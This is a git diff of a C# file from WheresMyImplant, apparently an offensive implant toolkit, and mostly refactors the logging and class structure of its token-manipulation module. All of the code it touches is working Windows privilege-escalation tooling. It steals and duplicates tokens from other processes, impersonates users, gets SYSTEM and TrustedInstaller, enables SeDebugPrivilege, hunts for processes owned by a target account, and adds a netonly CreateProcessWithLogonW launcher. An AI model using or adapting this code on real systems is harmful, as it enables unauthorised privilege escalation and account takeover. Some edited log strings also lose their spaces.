@@ -10,10 +10,10 @@ using System.Text;
 
 namespace WheresMyImplant
 {
-    class Tokens
+    class Tokens : Base
     {
-        private IntPtr phNewToken;
-        private IntPtr hExistingToken;
+        protected IntPtr phNewToken;
+        protected IntPtr hExistingToken;
         private IntPtr currentProcessToken;
         private Dictionary<UInt32, String> processes;
 
@@ -27,7 +27,7 @@ namespace WheresMyImplant
             WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
             if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
             {
-                Console.WriteLine("[-] Administrator privileges required");
+                WriteOutputBad("Administrator privileges required");
             }
 
             currentProcessToken = new IntPtr();
@@ -64,7 +64,7 @@ namespace WheresMyImplant
                 GetError("DuplicateTokenEx: ");
                 return false;
             }
-            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
+            WriteOutputGood("Duplicate Token Handle: "+ phNewToken.ToInt32());
             if (!CreateProcessWithTokenW(phNewToken, newProcess, ""))
             {
                 return false;
@@ -74,7 +74,7 @@ namespace WheresMyImplant
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public Boolean ImpersonateUser(Int32 processId)
+        public virtual Boolean ImpersonateUser(Int32 processId)
         {
             GetPrimaryToken((UInt32)processId, "");
             if (hExistingToken == IntPtr.Zero)
@@ -93,7 +93,7 @@ namespace WheresMyImplant
                 GetError("DuplicateTokenEx: ");
                 return false;
             }
-            Console.WriteLine(" [+] Duplicate Token Handle: " + phNewToken.ToInt32());
+            WriteOutputGood("Duplicate Token Handle: "+ phNewToken.ToInt32());
             if (!Unmanaged.ImpersonateLoggedOnUser(phNewToken))
             {
                 GetError("ImpersonateLoggedOnUser: ");
@@ -142,9 +142,9 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean GetTrustedInstaller(String newProcess)
         {
-            Console.WriteLine("[+] Getting NT AUTHORITY\\SYSTEM privileges");
+            WriteOutputGood("Getting NT AUTHORITY\\SYSTEM privileges");
             GetSystem();
-            Console.WriteLine(" [*] Running as: " + WindowsIdentity.GetCurrent().Name);
+            WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);
             
             Services services = new Services("TrustedInstaller");
             if (!services.StartService())
@@ -166,9 +166,9 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         public Boolean GetTrustedInstaller()
         {
-            Console.WriteLine("[*] Getting NT AUTHORITY\\SYSTEM privileges");
+            WriteOutputNeutral("Getting NT AUTHORITY\\SYSTEM privileges");
             GetSystem();
-            Console.WriteLine(" [+] Running as: " + WindowsIdentity.GetCurrent().Name);
+            WriteOutputGood("Running as: "+ WindowsIdentity.GetCurrent().Name);
 
             Services services = new Services("TrustedInstaller");
             if (!services.StartService())
@@ -188,9 +188,41 @@ namespace WheresMyImplant
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static Boolean CreateProcessWithTokenW(IntPtr phNewToken, String name, String arguments)
+        protected Boolean CreateProcessWithLogonW(IntPtr phNewToken, String name, String arguments)
         {
-            Console.WriteLine("[*] CreateProcessWithTokenW");
+            WriteOutputGood("CreateProcessWithLogonW");
+            IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
+            IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
+            Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
+            startupInfo.cb = (UInt32)Marshal.SizeOf(typeof(Structs._STARTUPINFO));
+            Structs._PROCESS_INFORMATION processInformation = new Structs._PROCESS_INFORMATION();
+            if (!Unmanaged.CreateProcessWithLogonW(
+                "i",
+                "j",
+                "k",
+                0x00000002,
+                name,
+                arguments,
+                0x04000000,
+                IntPtr.Zero,
+                "C:\\Windows\\System32",
+                ref startupInfo,
+                out processInformation
+            ))
+            {
+                GetError("CreateProcessWithLogonW: ");
+                return false;
+            }
+            WriteOutputGood("Created process: "+ processInformation.dwProcessId);
+            WriteOutputGood("Created thread: "+ processInformation.dwThreadId);
+            return true;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        ////////////////////////////////////////////////////////////////////////////////
+        protected Boolean CreateProcessWithTokenW(IntPtr phNewToken, String name, String arguments)
+        {
+            Console.WriteLine("CreateProcessWithTokenW");
             IntPtr lpProcessName = Marshal.StringToHGlobalUni(name);
             IntPtr lpProcessArgs = Marshal.StringToHGlobalUni(name);
             Structs._STARTUPINFO startupInfo = new Structs._STARTUPINFO();
@@ -211,8 +243,8 @@ namespace WheresMyImplant
                 GetError("CreateProcessWithTokenW: ");
                 return false;
             }
-            Console.WriteLine(" [+] Created process: " + processInformation.dwProcessId);
-            Console.WriteLine(" [+] Created thread: " + processInformation.dwThreadId);
+            WriteOutputGood("Created process: "+ processInformation.dwProcessId);
+            WriteOutputGood("Created thread: "+ processInformation.dwThreadId);
             return true;
         }
 
@@ -226,20 +258,20 @@ namespace WheresMyImplant
             scope.Connect();
             if (!scope.IsConnected)
             {
-                Console.WriteLine("[-] Failed to connect to WMI");
+                WriteOutputBad("Failed to connect to WMI");
             }
 
             ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
             ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
             ManagementObjectCollection objectCollection = objectSearcher.Get();
-            Console.WriteLine("[*] Examining " + objectCollection.Count + " processes");
+            WriteOutputNeutral("Examining "+ objectCollection.Count + "processes");
             foreach (ManagementObject managementObject in objectCollection)
             {
                 try
                 {
                     String[] owner = new String[2];
                     managementObject.InvokeMethod("GetOwner", (object[])owner);
-                    if ((owner[1] + "\\" + owner[0]).ToUpper() == userAccount.ToUpper())
+                    if ((owner[1] + "\\"+ owner[0]).ToUpper() == userAccount.ToUpper())
                     {
                         processes.Add((UInt32)managementObject["ProcessId"], (String)managementObject["Name"]);
                         size++;
@@ -247,15 +279,15 @@ namespace WheresMyImplant
                 }
                 catch (ManagementException error)
                 {
-                    Console.WriteLine("[-] " + error);
+                    WriteOutputBad(""+ error);
                 }
             }
-            Console.WriteLine("[*] Discovered " + size + " processes");
+            WriteOutputNeutral("Discovered "+ size + "processes");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public void GetPrimaryToken(UInt32 processId, String name)
+        public virtual void GetPrimaryToken(UInt32 processId, String name)
         {
             //Originally Set to true
             IntPtr hProcess = Unmanaged.OpenProcess(Constants.PROCESS_QUERY_INFORMATION, true, processId);
@@ -263,40 +295,40 @@ namespace WheresMyImplant
             {
                 return;
             }
-            Console.WriteLine("[+] Recieved Handle for: " + name + " (" + processId + ")");
-            Console.WriteLine(" [+] Process Handle: " + hProcess.ToInt32());
+            WriteOutputGood("Recieved Handle for: "+ name + "("+ processId + ")");
+            WriteOutputGood("Process Handle: "+ hProcess.ToInt32());
 
             if (Unmanaged.OpenProcessToken(hProcess, Constants.TOKEN_ALT, out hExistingToken))
             {
-                Console.WriteLine(" [+] Primary Token Handle: " + hExistingToken.ToInt32());
+                WriteOutputGood("Primary Token Handle: "+ hExistingToken.ToInt32());
             }
             Unmanaged.CloseHandle(hProcess);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static IntPtr OpenThreadTokenChecked()
+        private IntPtr OpenThreadTokenChecked()
         {
             IntPtr hToken = new IntPtr();
-            Console.WriteLine("[*] Opening Thread Token");
+            WriteOutputNeutral("Opening Thread Token");
             if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
             {
-                Console.WriteLine(" [-] OpenTheadToken Failed");
-                Console.WriteLine(" [*] Impersonating Self");
+                WriteOutputBad("OpenTheadToken Failed");
+                WriteOutputNeutral("Impersonating Self");
                 if (!Unmanaged.ImpersonateSelf(Enums.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation))
                 {
                     GetError("ImpersonateSelf");
                     return IntPtr.Zero;
                 }
-                Console.WriteLine(" [+] Impersonated Self");
-                Console.WriteLine(" [*] Retrying");
+                WriteOutputGood("Impersonated Self");
+                WriteOutputNeutral("Retrying");
                 if (!Unmanaged.OpenThreadToken(Unmanaged.GetCurrentThread(), (Constants.TOKEN_QUERY | Constants.TOKEN_ADJUST_PRIVILEGES), false, ref hToken))
                 {
                     GetError("OpenThreadToken");
                     return IntPtr.Zero;
                 }
             }
-            Console.WriteLine(" [+] Recieved Thread Token Handle: " + hToken.ToInt32());
+            WriteOutputGood("Recieved Thread Token Handle: "+ hToken.ToInt32());
             return hToken;
         }
 
@@ -304,9 +336,9 @@ namespace WheresMyImplant
         //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
         //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
         ////////////////////////////////////////////////////////////////////////////////
-        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege, Boolean bEnable)
+        public void SetTokenPrivilege(ref IntPtr hToken, String privilege, Boolean bEnable)
         {
-            Console.WriteLine("[*] Adjusting Token Privilege");
+            WriteOutputNeutral("Adjusting Token Privilege");
             ////////////////////////////////////////////////////////////////////////////////
             Structs._LUID luid = new Structs._LUID();
             if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
@@ -314,7 +346,7 @@ namespace WheresMyImplant
                 GetError("LookupPrivilegeValue");
                 return;
             }
-            Console.WriteLine(" [+] Recieved luid");
+            WriteOutputGood("Recieved luid");
 
             ////////////////////////////////////////////////////////////////////////////////
             Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
@@ -327,7 +359,7 @@ namespace WheresMyImplant
 
             Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
-            Console.WriteLine(" [+] AdjustTokenPrivilege Pass 1");
+            WriteOutputGood("AdjustTokenPrivilege Pass 1");
             if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 GetError("AdjustTokenPrivileges - 1");
@@ -347,14 +379,14 @@ namespace WheresMyImplant
 
             ////////////////////////////////////////////////////////////////////////////////
             Structs._TOKEN_PRIVILEGES kluge = new Structs._TOKEN_PRIVILEGES();
-            Console.WriteLine(" [+] AdjustTokenPrivilege Pass 2");
+            WriteOutputGood("AdjustTokenPrivilege Pass 2");
             if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref previousState, (UInt32)Marshal.SizeOf(previousState), ref kluge, out returnLength))
             {
                 GetError("AdjustTokenPrivileges - 2");
                 return;
             }
 
-            Console.WriteLine(" [+] Adjusted Token to: " + privilege);
+            WriteOutputGood("Adjusted Token to: "+ privilege);
             return;
         }
 
@@ -362,9 +394,9 @@ namespace WheresMyImplant
         //http://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
         //https://support.microsoft.com/en-us/help/131065/how-to-obtain-a-handle-to-any-process-with-sedebugprivilege
         ////////////////////////////////////////////////////////////////////////////////
-        public static void SetTokenPrivilege(ref IntPtr hToken, String privilege)
+        public void SetTokenPrivilege(ref IntPtr hToken, String privilege)
         {
-            Console.WriteLine("[*] Adjusting Token Privilege");
+            WriteOutputGood("Adjusting Token Privilege");
             ////////////////////////////////////////////////////////////////////////////////
             Structs._LUID luid = new Structs._LUID();
             if (!Unmanaged.LookupPrivilegeValue(null, privilege, ref luid))
@@ -372,7 +404,7 @@ namespace WheresMyImplant
                 GetError("LookupPrivilegeValue");
                 return;
             }
-            Console.WriteLine(" [+] Recieved luid");
+            WriteOutputGood("Recieved luid");
 
             ////////////////////////////////////////////////////////////////////////////////
             Structs._LUID_AND_ATTRIBUTES luidAndAttributes = new Structs._LUID_AND_ATTRIBUTES();
@@ -385,24 +417,24 @@ namespace WheresMyImplant
 
             Structs._TOKEN_PRIVILEGES previousState = new Structs._TOKEN_PRIVILEGES();
             UInt32 returnLength = 0;
-            Console.WriteLine(" [*] AdjustTokenPrivilege");
+            WriteOutputNeutral("AdjustTokenPrivilege");
             if (!Unmanaged.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
             {
                 GetError("AdjustTokenPrivileges");
                 return;
             }
 
-            Console.WriteLine(" [+] Adjusted Token to: " + privilege);
+            WriteOutputGood("Adjusted Token to: "+ privilege);
             return;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        public static void EnumerateTokenPrivileges(IntPtr hToken)
+        public void EnumerateTokenPrivileges(IntPtr hToken)
         {
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 TokenInfLength = 0;
-            Console.WriteLine("[*] Enumerating Token Privileges");
+            WriteOutputNeutral("Enumerating Token Privileges");
             Unmanaged.GetTokenInformation(
                 hToken, 
                 Enums._TOKEN_INFORMATION_CLASS.TokenPrivileges, 
@@ -413,10 +445,10 @@ namespace WheresMyImplant
 
             if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)  
             {
-                GetError("GetTokenInformation - 1 " + TokenInfLength);
+                GetError("GetTokenInformation - 1 "+ TokenInfLength);
                 return;
             }
-            Console.WriteLine(" [*] GetTokenInformation - Pass 1");
+            WriteOutputNeutral("GetTokenInformation - Pass 1");
             IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength) ;
             
             ////////////////////////////////////////////////////////////////////////////////
@@ -427,12 +459,12 @@ namespace WheresMyImplant
                 TokenInfLength, 
                 out TokenInfLength))
             {
-                GetError("GetTokenInformation - 2" + TokenInfLength);
+                GetError("GetTokenInformation - 2"+ TokenInfLength);
                 return;
             }
-            Console.WriteLine(" [*] GetTokenInformation - Pass 2");
+            WriteOutputNeutral("GetTokenInformation - Pass 2");
             Structs._TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (Structs._TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(Structs._TOKEN_PRIVILEGES_ARRAY));
-            Console.WriteLine(" [+] Enumerated " + tokenPrivileges.PrivilegeCount + " Privileges");
+            WriteOutputGood("Enumerated "+ tokenPrivileges.PrivilegeCount + "Privileges");
 
             ////////////////////////////////////////////////////////////////////////////////
             for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
@@ -444,14 +476,14 @@ namespace WheresMyImplant
                 Unmanaged.LookupPrivilegeName(null, lpLuid, null, ref cchName);
                 if (cchName < 0 || cchName > Int32.MaxValue)  
                 {
-                    GetError("LookupPrivilegeName " + cchName);
+                    GetError("LookupPrivilegeName "+ cchName);
                     return;
                 }
 
                 lpName.EnsureCapacity(cchName + 1);
                 if (Unmanaged.LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
                 {
-                    Console.WriteLine("  [*] " + lpName.ToString());
+                    WriteOutputNeutral(""+ lpName.ToString());
                 }
                 Marshal.FreeHGlobal(lpLuid);
             }
@@ -459,9 +491,9 @@ namespace WheresMyImplant
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
-        private static void GetError(String location)
+        protected void GetError(String location)
         {
-            Console.WriteLine(" [-] Function " + location + " failed: " + Marshal.GetLastWin32Error());
+            WriteOutputBad("Function "+ location + "failed: "+ Marshal.GetLastWin32Error());
         }
     }
 }
